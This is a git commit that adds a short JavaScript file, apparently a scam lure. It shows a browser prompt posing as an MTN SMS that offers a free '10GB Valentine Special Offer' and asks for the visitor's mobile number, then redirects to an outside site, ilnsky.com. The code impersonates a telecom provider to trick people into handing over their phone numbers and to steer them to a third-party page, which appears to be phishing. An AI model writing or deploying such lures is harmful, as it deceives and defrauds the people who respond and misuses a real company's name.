c48f1b2d8338e979bad2e5d089c6a87282ac73f4
ukpeha55-stack <ukpeha55@gmail.com>
2026-02-12 07:35:56 +0100

    Create mtn-val.js

---
+++ mtn-val.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 10GB'
+password=prompt('SMS: Congratulations, your MTN Number is eligible to receive 10GB Valentine Special Offer, click OK to Enter Your Mobile Number','ACTIVATE 10GB');
+if (password != 'ACTIVATE 10GB') {
+location.href='https://ilnsky.com/mtn-valentines.html';
+}
